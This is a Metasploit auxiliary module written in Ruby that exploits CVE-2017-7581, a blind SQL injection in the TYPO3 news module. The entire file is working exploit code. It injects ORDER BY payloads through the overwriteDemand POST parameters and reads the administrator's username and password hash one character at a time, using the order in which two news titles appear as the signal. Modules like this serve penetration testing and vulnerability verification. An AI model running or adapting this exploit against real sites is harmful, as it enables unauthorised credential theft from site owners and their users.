##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'TYPO3 News Module SQL Injection',
      'Description'    => %q{
         This module exploits a SQL Injection vulnerability In TYPO3 NewsController.php
         in the news module 5.3.2 and earlier, allows unauthenticated user to execute arbitrary
         SQL commands via vectors involving overwriteDemand for order and OrderByAllowed.
         This essentially means an attacker can obtain user credentials hashes.

         This module tries to extract username and password hash of the administrator user.
         It tries to inject sql and check every letter of a pattern, to see
         if it belongs to the username or password it tries to alter the ordering of results. If
         the letter doesn't belong to the word being extracted then all results are inverted
         (News #2 appears before News #1, so Pattern2 before Pattern1), instead if the letter belongs
         to the word being extracted then the results are in proper order (News #1 appers before News #2,
         so Pattern1 before Pattern2)
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Charles Fol', # initial discovery, POC
          'Marco Rivoli <marco.rivoli.nvh<at>gmail.com>' #MSF code
        ],
      'References'     =>
        [
          [ 'CVE', '2017-7581'  ],
          [ 'URL', 'http://www.ambionics.io/blog/typo3-news-module-sqli' ], # Advisory
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => 'Apr 6 2017',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('ID', [true, 'The id of TYPO3 news page', '1']),
        OptString.new('PATTERN1', [false, 'Pattern of the first article title', 'Article #1']),
        OptString.new('PATTERN2', [false, 'Pattern of the second article title', 'Article #2'])
      ])
  end

  def check
    # the only way to test if the target is vuln
    if test_injection
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
  end

  def test_injection()
    pattern1, pattern2 = try_autodetect_patterns
    if pattern1 == '' or pattern2 == ''
      print_error("Impossible to determine pattern automatically, aborting...")
      return false
    else
      print_status("Testing injection...")
      offset = 9
      field = 'username'
      table = 'be_users'
      condition = 'uid=1'
      digit_charset = "0".upto("9").to_a.join('')
      patterns = {:pattern1 => pattern1, :pattern2 => pattern2}
      size = blind_size(
       "length(#{field})+#{offset}",
       table,
       condition,
       2,
       digit_charset,
       patterns)
      return size != ''
    end
  end

  def dump_the_hash(patterns = {})
    ascii_charset_lower = "a".upto("z").to_a.join('')
    ascii_charset_upper = "A".upto("Z").to_a.join('')
    ascii_charset = "#{ascii_charset_lower}#{ascii_charset_upper}"
    digit_charset = "0".upto("9").to_a.join('')
    full_charset = "#{ascii_charset_lower}#{ascii_charset_upper}#{digit_charset}$./"
    username = blind('username','be_users', 'uid=1', ascii_charset, digit_charset, patterns)
    print_good("Username: #{username}")
    password = blind('password','be_users', 'uid=1', full_charset, digit_charset, patterns)
    print_good("Password Hash: #{password}")
  end

  def blind(field, table, condition, charset, digit_charset, patterns = {})
    # Adding 9 so that the result has two digits, If the lenght is superior to 100-9 it won't work
    offset = 9
    size = blind_size(
     "length(#{field})+#{offset}",
     table,
     condition,
     2,
     digit_charset,
     patterns
    )
    size = size.to_i - offset
    data = blind_size(
     field,
     table,
     condition,
     size,
     charset,
     patterns
    )
    return data
  end

  def select_position(field, table, condition, position, char)
    payload1 = "select(#{field})from(#{table})where(#{condition})"
    payload2 = "ord(substring((#{payload1})from(#{position})for(1)))"
    payload3 = "uid*(case((#{payload2})=#{char.ord})when(1)then(1)else(-1)end)"
    return payload3
  end

  def blind_size(field, table, condition, size, charset,  patterns = {})
    vprint_status("Retrieving field '#{field}' string (#{size} bytes) ...")
    str = ""
    for position in 0..size
      for char in charset.split('')
        payload = select_position(field, table, condition, position + 1, char)
        #print_status(payload)
        if test(payload, patterns)
          str += char.to_s
          #print_status(str)
          break
        end
      end
    end
    return str
  end

  def test(payload, patterns = {})
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path,'index.php'),
      'vars_get' => {
        'id' => datastore['ID'],
        'no_cache' => '1'
       },
       'vars_post' => {
         'tx_news_pi1[overwriteDemand][OrderByAllowed]' => payload,
         'tx_news_pi1[search][maximumDate]' => '', # Not required
         'tx_news_pi1[overwriteDemand][order]' => payload,
         'tx_news_pi1[search][subject]' => '',
         'tx_news_pi1[search][minimumDate]' => '' # Not required
       }
    })
    return res.body.index(patterns[:pattern1]) < res.body.index(patterns[:pattern2])
  end

  def try_autodetect_patterns()
    print_status("Trying to automatically determine Pattern1 and Pattern2...")
    res = send_request_cgi({
      'method'   => 'POST',
      'uri'      => normalize_uri(target_uri.path,'index.php'),
      'vars_get' => {
        'id' => datastore['ID'],
        'no_cache' => '1'
       }
    })
    news = res.get_html_document.search('div[@itemtype="http://schema.org/Article"]');
    if news.empty? or news.length < 2
      print_error("No enough news found on the page with specified id (at least 2 news are necessary)")
      return '',''
    end
    pattern1 = defined?(news[0]) ? news[0].search('span[@itemprop="headline"]').text : ''
    pattern2 = defined?(news[1]) ? news[1].search('span[@itemprop="headline"]').text : ''
    if pattern1.to_s.eql?('') || pattern2.to_s.eql?('')
      print_status("Couldn't determine Pattern1 and Pattern2 automatically, switching to user specified values...")
      pattern1 = datastore['PATTERN1']
      pattern2 = datastore['PATTERN2']
    end
    print_status("Pattern #1: #{pattern1}")
    print_status("Pattern #2: #{pattern2}")
    return pattern1, pattern2
  end

  def run
    pattern1, pattern2 = try_autodetect_patterns
    if pattern1 == '' or pattern2 == ''
      print_error("Impossible to determine pattern automatically, aborting...")
    else
      print_status("Dumping the username and password hash...")
      dump_the_hash(:pattern1 => pattern1, :pattern2 => pattern2)
    end
  end
end
